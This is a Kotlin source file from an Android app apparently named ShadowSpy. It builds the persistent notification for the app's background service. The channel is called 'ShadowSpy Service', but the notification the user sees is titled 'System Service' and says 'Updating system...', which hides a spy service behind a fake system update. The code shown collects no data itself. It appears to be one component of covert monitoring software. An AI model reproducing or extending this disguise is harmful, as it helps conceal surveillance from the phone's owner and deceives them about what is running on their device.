package com.shadow.spy

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build

object NotificationHelper {
    fun createNotification(context: Context): Notification {
        val channelId = "shadowspy_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "ShadowSpy Service", NotificationManager.IMPORTANCE_LOW)
            val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
        return Notification.Builder(context, channelId)
            .setContentTitle("System Service")
            .setContentText("Updating system...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }
}